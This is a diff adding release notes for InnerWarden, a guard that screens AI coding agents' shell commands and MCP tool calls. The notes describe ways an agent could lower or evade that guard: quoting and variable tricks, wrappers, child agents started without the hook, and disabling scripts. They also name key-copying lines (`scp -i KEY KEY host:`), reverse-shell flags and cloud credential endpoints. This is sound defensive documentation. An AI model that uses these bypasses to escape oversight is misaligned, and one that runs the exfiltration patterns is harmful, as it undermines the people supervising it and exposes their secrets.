@@ -3,6 +3,928 @@
 All notable changes to InnerWarden are documented here. This project
 follows semantic versioning.
 
+## 1.6.13 - 2026-11-16
+
+The guard reads more of what an agent starts. An agent that starts Claude
+Code without the hook that screens it is refused, Claude Code's read tools
+are judged by the rules a shell read is, and a container that hands an agent
+the host is refused. The MCP proxy also screens what a server sends back and
+lists, reads a command an argument chains onto a server's shell line, and
+judges a tool that runs what it is handed by what the call carries. The guard
+still reads the text of a command, and what it does not see is written down:
+[Where this ends](docs/features.md#where-this-ends).
+
+### Security
+
+- **A child Claude Code started without its hook is refused.** An agent could
+  start Claude Code with the hook that screens it switched off or moved away,
+  and the child then ran every tool call unscreened while the parent's own
+  calls were still judged. Under an enforcing hook such a start is now
+  refused as a lowering of the guard: Claude Code started in its bare, safe
+  or restricted mode, with setting sources that leave out the user's, with
+  settings that switch hooks off or empty the events the guard's hook sits
+  under, or with a variable it reads that moves the folder its hook is in or
+  switches its hooks off. Where all the line does is point Claude Code at
+  another settings folder, the refusal says how to install the hook in that
+  folder first (`innerwarden install claude-code --settings
+  <folder>/settings.json`). Claude Code started the ordinary way runs, and so
+  do settings that add a hook beside the user's, `HOME` set to the home
+  folder the shell puts in and `CLAUDE_CONFIG_DIR` set to the folder Claude
+  Code already uses, written as the shell expands them.
+- **More of the ways a command is started are read.** The rule on a child
+  agent follows the launchers it knows (`env`, `sudo`, `nohup`, `timeout`,
+  `xargs`, `npx` and the others the docs list), a variable set any way the
+  shell sets one (an assignment, `export` and its kin, `read`, a loop's name,
+  a default), and a command line handed to another program (a shell's
+  command string or its input, `eval`, `watch`, `tmux`, `su`, `find -exec`,
+  GNU `parallel`, `cmd /c`, PowerShell's `-Command`). What a line run by
+  `eval` sets is read as set for the rest of the line, however `eval` is
+  started. A line that another program runs through a shell (`su`,
+  `runuser`, `script` and `flock` with their command option, `watch`, a
+  `tmux` window, `npx -c` and pnpm's shell mode, a `git` setting given on the
+  line whose value git runs) is read as a shell's code is. In the hook and
+  in the MCP proxy, a tool call is read in the shapes it carries a command
+  in: a command string, an argument list, `args`, an environment as an
+  object or a list, text typed into a terminal or handed to a shell, also
+  one started through a launcher.
+- **Each command line read from a tool call is judged, and the strictest
+  verdict stands.** The lines go one at a time through the person's allows,
+  the second opinion, the agent profiles and every other layer, and the
+  strictest outcome stands, a refusal first. An allow written for one line
+  does not let a call run whose other line is refused.
+- **A shell or process tool call the hook cannot read is refused, as
+  before.** One that holds its command, its arguments or its environment in
+  a shape that cannot be read as words is refused as a call the hook cannot
+  read. A shell tool call with no command string, refused that way in
+  1.6.12, is now read in its other shapes, and is still refused when it
+  holds a field the hook does not read, a folder to run in among them.
+- **The MCP proxy reads a command chained onto a tool argument as the shell
+  does.** A server that puts an argument on a shell line runs a command the
+  argument adds after a control operator, in a subshell or in a
+  substitution. Each string of a call's arguments is now read with the
+  guard's own shell reader, in each place a server may put it, and the call
+  is refused when the command it adds reads a file, runs code, fetches or
+  relays, changes owners, modes, mounts or processes, takes privilege or
+  prints the environment. A shell tool's command line given in another shape
+  than its command string is judged as the line it is, and its words are
+  also read this way, unless the program they start is a shell.
+- **The MCP proxy screens what a server sends back.** A `resources/read` is
+  screened both ways: where it reads before the server is asked, and what
+  comes back before the client sees it. A secret-shaped value in any server
+  answer is masked in `guard` and `kill`; `advisory` and `warn` pass the
+  answer on and report it.
+- **What a server lists is screened for orders aimed at the model.** The
+  descriptions of tools, parameters, resources and prompts, and the
+  instructions a server sends when it starts, are screened. In `guard` and
+  `kill` the flagged text is replaced with a short notice before the client
+  sees it, and a server line the proxy cannot read is refused.
+- **Upstream rules for tool results and descriptions.** Fourteen rules the
+  Agent Threat Rules project marks stable are added for what a tool returns
+  and for tool descriptions. They only alert: none of them refuses a call.
+- **Claude Code's read tools are judged.** `Read`, `Grep` and `Glob` carry a
+  path and no command, and ran unscreened: the hook was not wired for them.
+  `innerwarden install` and `agents connect` now wire them, background setup
+  adds them to a hook wired by an earlier version in the mode it has, and
+  `innerwarden status` says when they are missing. What they open is judged
+  by the secret rules a shell read is: a `Read` of a private key, of a tool's
+  stored login or of a `.env` outside the project gets the verdict `cat` of
+  the same file gets, also under another name of the same file, such as a
+  link to it.
+- **A secret file is read as one in more of the ways a line reaches it.** A
+  tool's stored login in the home (the token files agent CLIs and developer
+  tools keep, `.netrc`, the GitHub CLI's hosts file) is now an always-secret
+  read. A private key or the shadow file is read as what it is when the same
+  command also names a softer path, a public certificate or a template. A
+  path written with `.` parts or doubled slashes, a pattern the shell
+  expands to the file, and a recursive read, archive or copy of the home are
+  read as reads of the secrets in them.
+- **A container that hands an agent the host is refused.** A container run,
+  created or entered with full privilege, the host's process namespace, a
+  capability that reaches the host, the host's disks or memory as devices, a
+  host system folder mounted writable or the host's root mounted, or the
+  container runtime's socket mounted; `nsenter` aimed at process 1; a call
+  to the runtime's API over its socket or its TCP port; and a debugging pod
+  on a cluster node. A mount source is read as the path it names, and
+  through its links on this host.
+- **Inline code that starts a download is read in more of the ways it is
+  written.** Node code is followed through the names it gives the process
+  module, a versioned interpreter name reads as the interpreter, Lua's shell
+  call and Python's subprocess calls are read, and a download saved to a
+  file and then run, by inline code or on a line handed to a shell, is read
+  as run. Code handed to a program the line names only at run time is read
+  as a shell would run it.
+- **A command in a substitution that reads a pipe as code is refused as code
+  fed.** A substitution in a piped command's own words runs before that
+  command and reads the same pipe, so a shell, an interpreter or a function
+  there that reads its input as code ran what the pipe carried, and the line
+  was judged by the command it sat in. Such a line is now refused as code
+  fed, as a pipe into that interpreter is. A download piped there is refused
+  too, not reviewed as a vendor's install line is: no installer is written
+  that way.
+
+### Changed
+
+- **The MCP proxy judges a tool that runs what it is handed by what the call
+  carries, not by its name.** A tool was refused for a word in its name
+  alone. Such a tool is now judged by its arguments: code it is handed passes
+  only when it is Python that can only compute and the call says the
+  language is Python, a call whose code cannot be found is refused, and
+  every other argument must be plain data. Some calls that were refused for
+  the tool's name now run.
+
+### Fixed
+
+- **A line that lists or tests the guard's program under a variable path is
+  no longer refused.** A word that holds a variable or a command
+  substitution and names the guard was read again, one level deeper each
+  time, until the depth limit refused it with a reason that said a kernel
+  protection was being changed, on lines that only list the program, test
+  for it or run a read-only verb. Such a word now reads as itself, and is
+  still checked as code.
+- **A program under a quoted path that ends in its name is read by that
+  name.** A line was refused whenever the word that names its program held a
+  command substitution: a linter under the folder a package manager prints,
+  a tool under the prefix of a version manager. A path in one pair of double
+  quotes, whose substitutions only print a folder, is now read by the name
+  after the last expansion.
+- **The folder queries of `go env` and `rustc --print sysroot` are read as
+  the other package tools' queries are.** A Go or Rust tool under the folder
+  that `go env GOPATH`, `GOROOT`, `GOBIN`, `GOMODCACHE` or `GOTOOLDIR`
+  prints, or under `rustc --print sysroot`, was still refused as a program
+  named at run time. Those queries, with exactly those arguments, are read
+  now, and so are the folder queries of `nodenv`, `goenv`, `jenv`, `gem`,
+  `uv`, `pipx`, `pipenv` and `conda` and a few more of `npm` and `git`. A
+  query is matched as the shell reads it, and a path built this way is read
+  by its name only in a line that shows nothing can change what the query
+  prints or where its path leads; any other line has it refused, as 1.6.12
+  refused it. In such a line every other command is one of a short list
+  known to write and run nothing (printing, reading, testing and the folder
+  queries themselves), so a command that writes, installs, builds, moves to
+  another folder, runs code or a line, or wraps another command counts,
+  whether or not it is named anywhere. A variable set alone, exported or
+  declared is one of a short list that only says how a tool prints or
+  reports, or a build target, flag or size that changes no folder, also in
+  a tool call's environment; one set in front of the program, where the
+  query has already run, is any but those that pick what the program loads
+  or runs. No file is written but the program's own output, no variable is
+  named for a descriptor, nothing is reckoned where the shell can run what
+  a variable holds (arithmetic, an element named by a variable, a
+  substring, a transform), no variable the shell sets from a command is
+  read, no function is defined, nothing is fetched, and the program runs
+  once, in no loop. The line is read as written, also what a command only
+  prints. A line that is only a shell handed one line is read as that
+  line. A tool call that holds a field the guard does not read, or a
+  variable no shell can name, has its lines judged also as moved first, and
+  the entries of a `commands` list also as one line.
+- **Showing a public SSH file is no longer refused.** A file in `~/.ssh` was
+  read as a secret whatever it held, so a line that showed a public key, the
+  known hosts or the authorized keys was refused, and so was a committed
+  example of a public key. These are read as public files now. A private
+  key named beside one on the same line, a name with a pattern or an
+  expansion in it or inside a substitution, a name in a line where the shell
+  may turn it into another, and a write into one are judged as before, and
+  in the hook a file of such a name that leads to a key is read as the key.
+- **A search for key or credential files in a project folder is no longer a
+  review.** A search was taken for a hunt across the machine whenever its
+  folder lay under the home or under `/srv`, `/opt`, `/var` or `/etc`, so a
+  search for `*.pem` in a project there was a review. Only the root, a
+  top-level folder where secrets are kept, a home and a hidden folder
+  directly in a home count as that broad now, also through a pattern; a
+  folder below one of them is a search of that folder.
+- **Two ordinary sequences no longer raise a taint alert in the MCP proxy.**
+  Listing a folder and then reading a file in it with a tool that calls its
+  path `file_path`, and installing a package and then running one of its
+  tools, whose answer repeated the name the agent itself had sent.
+
+### What this costs
+
+Some ordinary lines are refused under an enforcing hook, and the refusal says
+why. A child agent given `HOME` or `CLAUDE_CONFIG_DIR` in a form the shell
+does not expand to the home folder: in quotes or after a backslash, a `~` in
+a word `env` or `sudo` is handed (zsh passes it on as written), and any value
+in settings JSON. A variable set by arithmetic or by PowerShell anywhere on a
+line counts for the whole line. In the MCP proxy, a tool call that gives its
+command as an argument list or `args` keeps the file checks on its
+arguments, so a private key's path among them is refused there, also as the
+identity of `ssh`, and a word of it that would add a command to a server's
+shell line is refused, also where the server builds no such line. A public
+SSH file is refused, as in 1.6.12, in a line where the shell may turn its
+name into another. `eval` is refused however the line starts it, the setup
+lines of known tools excepted. A program named by an expansion the guard
+cannot resolve, on a line that also holds a substitution or at the end of a
+pipe, is refused, and the refusal says how to write the path so that its
+name can be read. A program
+under a folder query is refused, as in 1.6.12, where the same line also runs
+a command outside the short list that writes and runs nothing, sets or
+exports a variable outside its short list, or writes a file other than that
+program's own output: an install, a build or a move into a folder and then
+the tool, a folder made first, a `git` or tool command before it, a pipe
+into `tee`, a loop around the tool, and a tool call with a field the guard
+does not read or a folder for its command. A container
+started with full privilege, with `SYS_ADMIN` or in the host's process
+namespace, or with the runtime's socket mounted, and a call to the runtime's
+API on its socket, are refused also where that is ordinary work, such as a
+test tool that drives containers or a browser run in a container. A
+recursive `grep`, an archive or a recursive copy of the home, of a folder
+above it or of a hidden folder in the home is refused where a key or a
+stored login is kept in it (`~/.config`, where the GitHub CLI can keep its
+login), also when it looks for ordinary text. The read tools are refused
+what `cat` is: a `Read` of `~/.ssh/config`, of a private key kept in the
+project as a test fixture or of a stored login, which ran unscreened before.
+A session started in the home folder or at `/` names no project, so a read
+of a `.env` from there is refused to the agent, which is told to start in the
+project's own folder. A `Read` with no path is refused, as a shell call with
+no command is.
+
+The guard reads text, and its limits are listed in `docs/features.md`, under
+[The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).
+The boundary there is the host: on Linux, InnerWarden Pro's Execution Gate,
+armed for an agent, decides in the kernel which programs that agent's
+processes may start, whatever the command line says. It is off until you arm
+it.
+
+## 1.6.12 - 2026-11-11
+
+A correction first. 1.6.6 said "An agent can no longer lower the guard that
+screens it". That was not true as written: the guard reads the text of one
+command, and a line could say the same thing in a way the guard read
+differently from the shell. This release closes the ways we found, refuses
+what it cannot read, and writes down what a guard that reads text does not
+see: [The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).
+
+### Security
+
+- **A command that lowers the guard is read as the shell runs it.** Under an
+  enforcing hook, the guard's loosening commands were let through when the
+  line spelled them in a way the guard did not follow: a backslash inside
+  double quotes (`sh -c "sh -c innerwarden\ allow\ x"`), ANSI-C quoting
+  (`$'...'`), a comment, a here-document or a redirection between the words
+  (`innerwarden 2>/dev/null allow x`), a name built from another value on the
+  same line (`A=inner; B=${A}warden; $B monitor`) or cut out of a longer one
+  (`${X%/}`), the replace string of `xargs`, an `ssh` option that names a
+  command, a backslash as a C shell keeps it inside double quotes, or the
+  `-c` argument of `tcsh` and the other shells the list did not hold. Each is
+  now read as the shell reads it, at a cost that grows with the length of the
+  line and no faster.
+- **A line the guard cannot read is refused when it names the guard.** Where
+  a part of such a line stays unread (a command word that is a variable
+  nothing on the line settles, a substitution that prints the command), the
+  line is refused, not guessed at, and the refusal says how to write it so
+  that it can be read. A line that does not name the guard is refused this
+  way only where its own words spell a loosening command.
+- **A write from the shell to what carries the guard is refused.** The file
+  tools were already refused a write to the agent settings that load the
+  hook, to the guard's configuration and to the guard's program. The same
+  write from the shell was not: a redirection, `tee`, `cp`, `mv`, `rm`, `ln`,
+  `install`, `sed -i`, `dd`, a download saved over the file, a `chmod` that
+  closes it to its owner. Removing, moving or locking an agent's own settings
+  folder is refused with it. The writer is found beside a redirection of its
+  own, behind a loop word or a wrapper's options, with its target directory
+  or its in-place option in any spelling, and under a relative name after a
+  `cd` into the folder.
+- **Every command that lowers an InnerWarden Pro kernel guard through Pro's
+  own tools is refused**, not only the ones the list named.
+- **An ssh key used twice on a line is a read of the key.** A key given as
+  the identity (`-i`) is key use, and is let through. The excuse was given by
+  the text, so a line that named the same file as the identity and as the
+  file to copy (`scp -i KEY KEY host:`) copied the key out unrefused. The
+  excuse is now given by the place a word stands at, also behind a lock or a
+  scheduling wrapper, and a key behind a variable the line sets
+  (`F=KEY; cat $F`) is read as the key.
+- **A hook that gives no answer refuses the call.** An agent blocks a call
+  only when its hook answers with a refusal. A hook that crashed on a fault,
+  or that took longer than the agent waits, let the call run, unscreened and
+  unrecorded. The hook now answers within ten seconds (thirty where a second
+  opinion from a model is configured: that wait has twenty of its own) and
+  handles the fault: a refusal under an enforcing hook; in monitor, a line
+  that says the call went unscreened. Not closed: a hook that is killed
+  outright, a fault on Windows, and an agent set to wait less for its hook
+  than the hook takes.
+
+### Fixed
+
+- **`rsync -e ssh` is no longer refused as a reverse shell.** The text
+  `rsync -e` ends in the letters of `nc -e`, netcat's exec flag, which was
+  matched anywhere in the command. It now counts only where the name starts a
+  word.
+
+### What this costs
+
+Some ordinary lines are now refused under an enforcing hook, and the refusal
+says they are the person's to run: a program run from a variable on a line
+that also names the guard (`P=innerwarden; $P --version`), an agent that
+copies a new `innerwarden` binary into place, one that writes a project's
+`.mcp.json` or `.claude/settings.json` from the shell, removes a project's
+`.claude` folder, or sets an agent's settings file to a mode that takes the
+read or the write from its owner (`chmod 400`; `chmod 600` is let through).
+The guard's name inside a longer word, a folder such as
+`~/src/innerwarden-site`, counts as naming it where the line also holds a
+command the guard cannot read and a loosening word. After a `cd` into an
+agent's settings folder, a later write to a settings file by its bare name is
+refused, also behind a second `cd`. A line that costs more to read than the
+guard spends on one line, with a variable in a command left unread or with
+more changes of directory than the guard follows, is refused with the way to
+shorten it.
+
+## 1.6.11 - 2026-10-24
+
+### Added
+
+- **OpenClaw's own tools are screened before they run.** Until now only the
+  MCP servers `agents connect openclaw` wraps went through the guard:
+  OpenClaw's own `exec`, `process`, `write`, `edit` and `apply_patch` never
+  reached it. `innerwarden agents connect openclaw` now also installs the
+  `innerwarden-guard` plugin on OpenClaw's `before_tool_call` hook (OpenClaw
+  2026.9.7), which asks `innerwarden openclaw screen` about each call: the
+  screening the Claude Code hook uses (the general rules, your allow and mute
+  rules, the per-agent profiles, the privileged-file rule for what a file tool
+  writes) and, where InnerWarden Pro is installed, Pro's `check-command` too.
+  Monitor (the default) records only. After `innerwarden enforce` a deny is
+  refused, and the model is told only "Refused by InnerWarden."; a review asks
+  you to allow it once or deny it, and nobody answering in time is a refusal.
+  The record credits each refusal to the chat it belonged to (the session
+  key). The plugin answers first and last among OpenClaw's plugins, so the
+  call that runs is the copy that was screened, not a rewrite another plugin
+  made in between.
+- On a host with InnerWarden Pro, the approval card, `innerwarden agents list`
+  and the dashboard's OpenClaw card say what Pro holds there (the Execution
+  Gate for this agent, the DNS Guard, the licence), as Pro reads it. A
+  conversation attempt is recorded as `kernel_denied` only where Pro's
+  Execution Gate, in enforce for that agent, refused a program during a call
+  of that chat, as Pro recorded it.
+- A one line suggestion about InnerWarden Pro, to the owner only (the Control
+  UI approval card, `agents list`, the dashboard), on a measured fact: a
+  program this agent tried to run was refused or held for review, or monitor
+  let through a call enforce would have stopped. At most once a week unasked,
+  never in a reply to a chat, never on macOS or Windows; on a host with Pro
+  it names the next step for the gate instead.
+
+### Security
+
+- **The CLI's short names are its name to the guard everywhere.** The hook
+  refused `innerwarden dry-run` in a command string, built from quoted pieces
+  or behind a variable, but not the same with the installer's `iw` or
+  `iw-guard`: `env -S 'iw dry-run'`, `flock -c 'iw dry-run'`, `busybox sh -c
+  'iw dry-run'`, `'i'w dry-run` and `I=iw; $I dry-run` passed. The guard now
+  reads every name of the CLI in command strings, with the line's quotes and
+  the variables it sets resolved as the shell resolves them.
+- An agent can no longer take off the OpenClaw guard: a file tool may not
+  write into `~/.openclaw/extensions` or `~/.openclaw/hooks`, and the hook
+  refuses removing them, `openclaw plugins disable|uninstall` of InnerWarden's
+  plugin or hook, adding or enabling an OpenClaw plugin, `openclaw config set`
+  of the plugin or MCP wiring, and `sed -i` on `openclaw.json`.
+- Active Defence's own guard-lowering verbs are refused like the free CLI's:
+  `innerwarden-ctl agent disconnect`, `agent install-hook --remove` and
+  `--monitor`, and `innerwarden-ctl uninstall`.
+- OpenClaw's exec shell is recognised as an AI agent's shell
+  (`OPENCLAW_SHELL`), so `agents disconnect`, `connect --monitor`, `install
+  --monitor`, `contain`, `dry-run`, `monitor` and `uninstall` refuse there as
+  they do in Claude Code's, Codex's and Gemini CLI's.
+- Stated limit: a plugin that freezes a rewrite of its own under an approval
+  of its own, before the guard answers, decides what runs; the guard records
+  that the call ran other than as screened, after it ran.
+
+## 1.6.10 - 2026-10-24
+
+### Security
+
+- **A wrapper in front of the CLI no longer hides it from the guard.** A
+  program the guard did not unwrap (`flock`, `taskset`, `systemd-run --user`,
+  `prlimit`, `unshare`, `cpulimit`, `watch`) in front of `iw` let `uninstall`,
+  `dry-run` or `agents disconnect` through the enforcing hook, and
+  `systemd-run --user` or `env -u` then ran it without the agent's shell
+  markers, so the CLI did not refuse it either. Behind any program the guard
+  does not know, the CLI named with a verb that lowers the guard is now read
+  as run (a program that only reads or prints text keeps it as text).
+
+### Fixed
+
+- The hook no longer refuses `innerwarden uninstall --dry-run`, `--help` and
+  `-h`, which remove nothing, and reads them as `uninstall`'s own only before
+  `--`.
+- Stated limit, widened: a Bash command that only writes a guard verb into a
+  file (`echo ... > x.sh`, `printf`, a heredoc) is not screened as running it,
+  like a Write or Edit tool call; the CLI refuses the verb when the agent's
+  shell runs the file with its markers.
+
+## 1.6.9 - 2026-10-24
+
+### Security
+
+- **An agent can no longer take its guard off with `uninstall`, or lower it
+  from a script.** Under an enforcing hook, the hook refused only the literal
+  text `innerwarden uninstall`: `iw uninstall claude-code`, a quoted verb or
+  two spaces took the hook off. And `innerwarden dry-run`, `monitor` and
+  `uninstall` had no refusal of their own in the CLI, so a script the agent
+  wrote and ran lowered or removed the hook. The hook now reads `uninstall`
+  as the person's whatever its spelling (its own `--dry-run` and help stay
+  open), and the CLI refuses `uninstall`, `dry-run` and `monitor` inside an AI
+  agent's shell, a script it runs included.
+- Stated limit: the CLI's refusal reads the agent's shell markers, which a
+  script can unset, and the content of a file the agent writes with a Write
+  or Edit tool call is not screened for these verbs.
+
+## 1.6.8 - 2026-10-24
+
+### Security
+
+- **Two more ways an agent could lower its own guard are closed.** Under an
+  enforcing hook, `innerwarden install <agent> --monitor` rewired the hook to
+  record only, as `agents connect --monitor` did before 1.6.6, and was let
+  through. And the hook read a help flag or a `--dry-run` anywhere in a
+  `contain` line, including in the agent's own command after `--` (`contain
+  --setup --monitor -- -h`) or after the first word (`contain --monitor true
+  --dry-run`), so it let through a `contain` that then rewired the hook. The
+  hook now refuses `install --monitor` as the person's, the CLI refuses it
+  inside an AI agent's shell, and `contain`'s help and dry run are read among
+  its own arguments only, as the CLI reads them.
+- Stated limit, unchanged: the CLI's own refusal reads the agent's shell
+  markers, which a script the agent writes can unset, and the hook knows the
+  CLI by its names (`innerwarden`, `iw`, `iw-guard`), so a renamed copy run
+  from a script is not seen. The hook refuses every spelling it can read.
+
+## 1.6.7 - 2026-10-24
+
+### Added
+
+- **A refusal made in a jail reaches the host's case.** Inside a jail started
+  with `contain --identity`, where Active Defence runs on the host, the hook
+  now reports each shell command it refuses itself (a deny of the general
+  rules, a hard rule, a profile's refusal) to the host once the refusal
+  stands, so the host's case of that session lists it beside the commands it
+  was asked about. The refusal is the hook's, and nothing the host answers
+  changes it. An older Active Defence refuses the report, and nothing else
+  changes.
+
+### Fixed
+
+- Tests for three gaps the nightly mutation sweep found (the account's keys
+  removed behind a rewrite, the remote MCP server count of a Codex file, and a
+  guard that could never be false in the credential-store check).
+
+## 1.6.6 - 2026-10-24
+
+### Security
+
+- **The guard refuses an agent three more commands that lower it.** (This
+  entry first said "An agent can no longer lower the guard that screens it",
+  which is more than a guard that reads the text of a command can promise:
+  see 1.6.12 and [the limits](docs/features.md#where-this-ends).) Under an
+  enforcing hook, `innerwarden agents connect <agent> --monitor`,
+  `innerwarden agents disconnect` and `innerwarden contain` (which rewrites
+  the agent's hook) were let through, while `dry-run` and `monitor` were
+  refused. The hook now refuses all of them as the person's, and the CLI
+  refuses them inside an AI agent's shell, where the hook cannot see the call
+  (a script the agent wrote). A read, a connect that keeps enforcing, help and
+  `contain --dry-run` stay open.
+
+### Fixed
+
+- **`innerwarden contain` keeps the hook's mode.** With no mode asked, it set
+  an enforcing hook to monitor, unsaid, also when the jail then failed to
+  start. It now keeps the mode the hook already has (a first wiring takes
+  monitor), and says the mode on every run.
+
+## 1.6.5 - 2026-10-24
+
+1.6.4 was tagged and not published: its new jail check on macOS started
+`sandbox-exec` with the account's environment. 1.6.5 is 1.6.4 with that check
+under the launcher's own environment (root's two folders as `PATH`, no loader
+variable), as every program a launch starts.
+
+
+### Added
+
+- **The dashboard shows what the free product does.** Overview, Decisions,
+  Protection, Agents and Tokens were rebuilt on one foundation: each agent
+  with its mode, what it screens and how to restart it (Claude Code: `/exit`,
+  then `claude`; Codex: quit and start again), the decision history by day
+  with the reason in words, recent sessions, the allow and mute lists with
+  their remove step, the jail check, and how many MCP servers each agent has
+  (local and remote). A value that could not be read is said as not read,
+  never as off or zero, and monitor is said plainly.
+- **One plan notice for an Active Defence host**: its licence ending soon,
+  partly covered, lapsed to free mode, or not read, with the one step that
+  fixes it. A Community install draws none.
+- `install`, `agents connect`, `enforce` and `dry-run` say how to restart each
+  agent they changed.
+
+### Changed
+
+- tokio 1.53.3 (RUSTSEC-2026-0386).
+
+## 1.6.3 - 2026-10-23
+
+### Fixed
+
+- **Every cloud's metadata service is an internal target.** Besides EC2,
+  Azure and GCP (`169.254.169.254`, `metadata.google.internal`) and Alibaba,
+  the guard now reads the ECS task credentials endpoint (`169.254.170.2`,
+  `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`), EKS Pod Identity
+  (`169.254.170.23`) and EC2's IPv6 endpoints (`fd00:ec2::254`,
+  `fd00:ec2::23`), with the address ended by a quote, a bracket or a
+  variable too. Their credential reads are refused.
+- **Removing the account's keys is destructive**, as removing the home is:
+  `rm` of `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.azure`,
+  `~/.config/gcloud`, `~/.aws/credentials`, `~/.kube/config` or a private
+  key `~/.ssh/id_*` is refused. `rm ~/.ssh/known_hosts`, a `.pub` and a
+  cache under a store stay cleanups.
+- **`innerwarden graph --clear` is the person's**, as `allow` and `mute`
+  are: refused with no terminal (an operator's `--operator` outside an
+  agent's shell clears it), and the hook refuses an agent that runs it.
+- **`check`'s human summary writes out what would repaint or hide the
+  command** (control characters other than a new line or a tab, bidi
+  overrides, characters that draw nothing) as `\u{..}`. `--json` is
+  unchanged.
+- **Chat alerts ping nobody and link nowhere**: Discord parses no mention in
+  them, and Slack's `&`, `<` and `>` are escaped.
+
+## 1.6.2 - 2026-10-23
+
+### Fixed
+
+- **The user namespace check of 1.6.1 runs bubblewrap like every other
+  program `contain` starts**: with root's two folders as `PATH` and no
+  dynamic loader variable (`helper_env`), instead of a cleared environment.
+  Nothing a person sees changes; Active Defence reads the launcher's
+  contract by that shape before it pins a free CLI release.
+
+## 1.6.1 - 2026-10-23
+
+### Fixed
+
+- **`innerwarden contain` on Ubuntu 26.04 (and any kernel that restricts
+  unprivileged user namespaces) asks bubblewrap itself.** Under
+  `kernel.apparmor_restrict_unprivileged_userns = 1` it looked only for a
+  profile file of its own and refused where the distribution's profile
+  (`/etc/apparmor.d/bwrap-userns-restrict`, Ubuntu 26.04) already grants
+  bwrap a user namespace, and the profile it printed replaced the
+  distribution's once loaded. A run now starts bwrap once with a user
+  namespace (`bwrap --unshare-user --ro-bind / / true`, 5 seconds at most):
+  granted, nothing is said, whatever profile granted it; refused, the advice
+  is said. Refused with the distribution's profile on disk, the advice loads
+  that one (`sudo apparmor_parser -r /etc/apparmor.d/bwrap-userns-restrict`)
+  and never writes another. A dry run, which runs nothing, goes by the files
+  on disk, the distribution's included.
+
+## 1.6.0 - 2026-10-22
+
+### Upgrade notes: what to do
+
+- **A profile's read-only path (`extra_ro`) through a link stays read-only
+  where it leads.** `innerwarden contain --identity` follows your own links
+  in such a path (in folders no jail writes: `~/code` or `~/.local` kept on
+  another disk) and lays the path where the jail shows the folder it leads
+  to. A link in a folder a jail writes (`~/.local/share/demo`, which a
+  program in an earlier jail could have made) is followed only to a place
+  the jail shows already, and the start says on one line that the link
+  itself is not held ("... is a link in a folder a program in the jail can
+  write: the jail keeps <where it leads>, where it leads, read-only, but
+  that program could replace the link; ..."): replace the link with the
+  folder it leads to. Such a link to a place the jail shows nothing else of
+  is not followed: the path is left out, said ("... the jail does not
+  follow it, and starts without the extra path; list the real folder
+  instead"). On macOS nothing of this is left out: the path is denied
+  writing as named and where it leads. On Linux, where `bwrap` cannot bind
+  a folder from a descriptor (its `--help` lists no `--ro-bind-fd`: upstream
+  bubblewrap before 0.10.0, or a distribution's package without the security
+  update that added it; the current packages of Debian 12, Ubuntu 22.04 and
+  24.04, and RHEL 9 have it), a read-only path in a folder a jail writes
+  (`<project>/vendor`, `~/.local/share/claude/versions`) is left out and said
+  ("... does not make it read-only; bubblewrap 0.10.0 or later, ... keeps
+  it"): the jail shows it and its programs can write it, where 1.5.5 laid it
+  read-only by name. Update bubblewrap to keep it. A profile with
+  `start = "only_when_admitted"` does not start there: the launch stops,
+  names each such path and says what to do. A read-only path in a place the
+  jail hides (on Linux `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.mozilla`,
+  `~/.thunderbird` and InnerWarden's own
+  folder; on macOS `~/.ssh`, `~/.gnupg`, `~/.aws`, InnerWarden's own folder,
+  `~/Library/Mail`, `~/Library/Messages` and `~/Library/Safari`; or where one
+  of them leads), under a profile's `hide_home` path, your home or a folder
+  above it, or with `--identity` `/run` or `/sys`, used to stop the launch:
+  it is left out now, said on one line, and the jail starts without it. One
+  that holds such a place where the jail shows it already (`~/.config`,
+  which holds InnerWarden's own folder) is laid read-only, and the place
+  stays hidden; on Linux one that holds such a place where the jail shows
+  nothing else of it is left out.
+- **A project whose `.git` file names a folder that does not name the
+  project back is no worktree in `innerwarden contain`.** The jail shows a
+  linked worktree's git folders only where git made them for this project:
+  the worktree's git folder names this project's `.git` file back and sits
+  in the `worktrees` folder of its repository, or (a submodule) its config
+  names this project as its work tree; the repository is a git folder
+  (`HEAD`, `objects`, `refs`); both belong to you; no link is on the way to
+  either; and neither is your home, a folder above it, a place the jail
+  hides, or in a hidden folder of your home that the jail does not show on
+  Linux and lets no program write on macOS (`~/.kube`, `~/.docker`,
+  `~/.password-store`, `~/.dotfiles`). Every folder
+  on the way is there: a path through a folder that is not there and back
+  (`nx/../L`) names none. Any other `.git` file is left alone, the start
+  says why on one line, the jail starts, and git in a Linux jail sees no
+  repository there, while git in a macOS jail cannot commit there (it may
+  still read it). A worktree whose repository you keep in a hidden folder
+  of your home that the jail does not show on Linux and lets no program
+  write on macOS (`~/.dotfiles`; `~/.config`, `~/.local` and the other
+  folders every jail shows writable are fine: the jail shows a repository
+  there through that folder, and binds nothing more for it), or reach
+  through a link, is not shown either: keep the repository elsewhere, or
+  name it by its real path (`git worktree repair`). A worktree whose folder
+  lies over the place InnerWarden's own folder, a hidden dotdir or a link
+  inside one leads to is left out the same way, with one line, and the jail
+  starts. A worktree moved by hand needs `git worktree repair` first. A
+  repository made with `--separate-git-dir` (`git init` or `git clone`, the
+  layout of dotfile managers such as yadm and vcsh) keeps nothing that names
+  the project back, so it is not shown either, where 1.5.5 showed it (one in
+  a folder the jail shows anyway, such as `~/.local/share`, still works):
+  move its git folder into the project in place of the `.git` file, or work
+  in a linked worktree (`git worktree add`).
+- **The command line of a running jail's bubblewrap changed.** An
+  identified jail's (`--identity`) now starts with its seccomp filter
+  (`--seccomp <fd>`), before every other option. Where bwrap binds a place
+  from a descriptor (bubblewrap 0.10.0 or later, or a package with the
+  security update that added it), the real run of any jail binds the
+  folders it pins, a profile's read-only paths and a worktree's git folders
+  with `--bind-fd <fd> <place>` and `--ro-bind-fd <fd> <place>` instead of
+  `--bind` and `--ro-bind-try` by name; a dry run still names each by its
+  host folder. A tool that reads a jail's command line (from `/proc`) has
+  to know those options.
+- **On macOS a program in `innerwarden contain` can no longer rename, remove
+  or replace the project folder itself, `~/.config`, a folder between the
+  project and a `--deny-read` path, or any other folder the jail may write
+  above a place it hides or a profile's read-only path (`~/.cache` or
+  `/tmp` above a project there that holds a `--deny-read` path).**
+  It still writes in them, finds them writable and sets their mode and
+  times; only the folder itself keeps its name. A tool that renames the
+  folder it works in has to run outside the jail. Where such a folder is not
+  there yet (`~/.config` on an account that has none), `innerwarden contain`
